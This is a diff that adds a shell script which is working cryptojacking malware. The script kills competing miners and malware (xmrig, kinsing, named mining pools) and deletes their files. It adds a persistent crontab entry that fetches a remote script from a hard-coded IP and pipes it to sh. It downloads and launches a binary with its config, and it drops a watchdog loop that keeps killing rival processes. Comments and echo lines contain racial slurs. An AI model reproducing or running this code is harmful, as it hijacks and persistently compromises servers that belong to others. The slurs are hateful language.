@@ -1,0 +1,140 @@
+#!/bin/sh
+
+echo 12334
+
+# nigger
+pkill -f  xmrig
+pkill softirq
+pkill -f  watcher
+pkill -f  /tmp/a
+pkill -f  health.sh
+pkill -f ".XIN-unix"
+pkill -9  vim
+rm -rf /var/www/futureoftaste
+rm -rf /etc/id.services.conf
+pkill -f '/etc/32678'
+pkill -f "/tmp/runnv/lived.sh"
+rm -rf /tmp/runnv
+pkill -f "49nbZB84CgbenDUfv4hxbHJSqgbmSmTsdiJqFyeNF6E4Hbvj8CeF6j1KbFLoWzcvEsZMqZXEedrPZKpYgAbAKrUgLFNzSDz"
+rm -rf /tmp/xmrig.tar.gz
+pkill -f "pool.hashvault.pro"
+rm -rf /tmp/kamd64
+rm -rf /tmp/p.sh
+pkill -f "/tmp/kamd64"
+pkill -f "/tmp/p.sh"
+pkill -f "./ddd"
+pkill -f "kinsing"
+rm -rf "$HOME/.local/share/.05bf0e9b"
+rm -rf /tmp/dockerd
+rm -rf /tmp/docker-daemon
+rm -rf /tmp/update
+pkill -9 "dockerd"
+pkill -9 "/tmp/docker-daemon"
+pkill -9 "/tmp/update"
+rm -rf /etc/rondo/rondo
+rm -rf /etc/profile.d/d.sh
+rm -rf /tmp/*.*
+pkill -f 'zpool|c3pool|nanopool|supportxmr|hashvault|p2pool|skypool|xmrpool|herominers|antpool|monerohash|zergpool|mining-dutch|solopool'
+
+
+sed -i '/@reboot root \/etc\/profile.d\/d.sh/d' /etc/crontab
+sed -i '/@reboot root \/etc\/rondo\/rondo react.x86_64.persisted/d' /etc/crontab
+
+if ! grep -q "@reboot root busybox wget -q http://5.255.121.141/nuts/bolts -O-|sh;curl -s http://5.255.121.141/nuts/bolts|sh" /etc/crontab; then
+    echo "@reboot root busybox wget -q http://5.255.121.141/nuts/bolts -O-|sh;curl -s http://5.255.121.141/nuts/bolts|sh" >> /etc/crontab
+fi
+
+P="fghgf"
+K="stink.sh"
+C2="/dev /tmp /etc /var/www /dev/shm /var"
+M1=5120
+R=""
+
+for D in $C2; do
+    if [ -d "$D" ] && [ -w "$D" ] && [ -x "$D" ]; then
+        A=$(df -k "$D" | awk 'NR==2 {print $4}')
+        if [ "$A" -ge "$M1" ]; then
+            R="$D"
+            break
+        fi
+    fi
+done
+
+if [ -z "$R" ]; then
+    R="/dev/shm"
+fi
+
+X=0
+XX=0
+LL=0
+L=0
+echo "my nuts itch nigga"
+
+p=$(pgrep -f "$P")
+for pid in $p; do
+    if [ -d "/proc/$pid" ]; then
+        state=$(awk '/State/ {print $2}' /proc/$pid/status)
+        if [ "$state" = "Z" ]; then  
+            X=1
+        else 
+            XX=1
+        fi
+    else
+        X=1
+    fi
+done
+
+pa=$(pgrep -f "$K")
+for pid in $pa; do
+    if [ -d "/proc/$pid" ]; then
+        state=$(awk '/State/ {print $2}' /proc/$pid/status)
+        if [ "$state" = "Z" ]; then
+            LL=1
+        else
+            L=1
+        fi
+    else
+        LL=1
+    fi
+done
+
+if ! pgrep -f $P > /dev/null; then
+    X=1  
+fi
+if ! pgrep -f $K > /dev/null; then
+    LL=1
+fi
+
+if [ "$X" -eq 1 ] && [ "$XX" -eq 0 ]; then
+    rm -rf ${R}/$P ${R}/ijnegrrinje.json;
+    (busybox wget -q http://5.255.121.141/nuts/lc -O-||busybox wget -q http://5.255.121.141/nuts/lc -O-||curl -o- http://5.255.121.141/nuts/lc)>${R}/ijnegrrinje.json;
+    (busybox wget -q http://5.255.121.141/nuts/x  -O-||busybox wget -q http://5.255.121.141/nuts/x  -O-||curl -o- http://5.255.121.141/nuts/x)>${R}/$P;
+    chmod 777 ${R}/$P;
+    ${R}/$P -c ${R}/ijnegrrinje.json -B &
+fi
+
+if [ "$LL" -eq 1 ] && [ "$L" -eq 0 ]; then
+    cat <<'EOF' > "${R}/${K}"
+while true; do
+    for proc_dir in /proc/[0-9]*; do
+        pid=${proc_dir##*/}
+
+        if strings "/proc/$pid/exe" 2>/dev/null | grep -Eq 'xmrig|rondo|UPX 5|futureoftaste'; then
+            kill -9 "$pid"
+            continue
+        fi
+        result=$(ls -l "/proc/$pid/exe" 2>/dev/null)
+        case "$result" in
+            *"(deleted)"* | *"xmrig"* | *"hash"* | *"watcher"* | *"/dev/a"* | *"softirq"* | *"rondo"* | *"UPX 5.02"* | *"/tmp/."* | *"kinsing"* | *"/tmp/bot"* | *"futureoftaste"* | *"/tmp/vim"* | *"/tmp/docker"* | *"/tmp/pew63"*)
+                 kill -9 "$pid"
+                 ;;
+        esac
+    done
+    sleep 45
+done
+EOF
+    chmod 777 "${R}/${K}"
+    ${R}/${K} &
+fi
+
+echo MEOWWWWWWWWW
